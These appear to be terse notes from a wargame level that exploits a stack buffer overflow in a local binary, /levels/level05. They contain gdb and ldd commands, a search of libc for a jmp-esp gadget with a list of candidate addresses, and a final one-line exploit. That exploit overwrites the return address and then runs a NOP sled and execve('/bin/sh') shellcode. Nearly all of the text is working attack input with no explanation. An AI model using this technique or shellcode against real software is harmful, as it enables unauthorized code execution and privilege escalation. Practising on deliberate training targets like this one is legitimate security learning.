gdb --args /levels/level05 `perl -e 'print "A"x140, "\x0c\x0c\x0c\x0c"'`

$ ldd /levels/level05
linux-gate.so.1 =>  (0xb7fff000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7ea0000)
/lib/ld-linux.linuxso.2 (0x80000000)

b main

find /b 0xb7ea0000, 0xb7fff000, 0xff, 0xe4
0xb7f9b5f3
0xb7faa1fb
0xb7fab077
0xb7fab25f
0xb7fab91b
0xb7fab923
0xb7fac007
0xb7fac847
0xb7faeb0f
0xb7fb7e4b
0xb7fb82a3
0xb7fb833b
0xb7fb83bb
0xb7fb840b
0xb7fb86cb
0xb7fb878b
0xb7fb87bb
0xb7fb8923
0xb7fb8f0b
0xb7fb90fb
0xb7fb9163
0xb7fb9553
0xb7fb96eb
0xb7fb9743
0xb7fb977b
0xb7fb9a63
0xb7fb9b2b
0xb7fba113
0xb7fba23b
0xb7fba2f3
0xb7fba61b
0xb7fbb753 \x53\xb7\xfb\xb7

/levels/level05 `perl -e 'print "A"x140, "\x53\xb7\xfb\xb7", "\x90"x8,
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
